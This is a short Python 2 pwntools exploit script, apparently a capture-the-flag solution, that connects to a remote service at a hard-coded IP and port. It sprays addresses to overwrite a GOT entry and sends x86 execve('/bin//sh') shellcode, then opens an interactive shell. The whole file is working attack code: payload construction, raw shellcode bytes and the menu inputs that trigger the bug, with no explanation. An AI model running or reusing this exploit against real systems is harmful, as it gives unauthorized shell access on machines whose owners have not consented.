from pwn import *

HOST, PORT = '0.0.0.0', 8004
HOST, PORT = '118.70.80.143', 23501
r = remote(HOST, PORT)
gets = 0x8048480
target_got = 0x804a000+0x10
sh = target_got + 24
shellcode = '\xcc'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69""\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload1 = 'a' * 2 + p32(target_got - 50) * 1000
print hex(target_got - 50)
payload2 = p32(sh) * 6 + shellcode

raw_input('>> ')
r.sendline('1')
r.sendline('1')
r.sendline('1')
r.sendline('1')
r.sendline('2')
r.sendline('1')
r.sendline(payload1)
r.sendline('2')
r.sendline('1')
r.sendline(payload2)
r.interactive()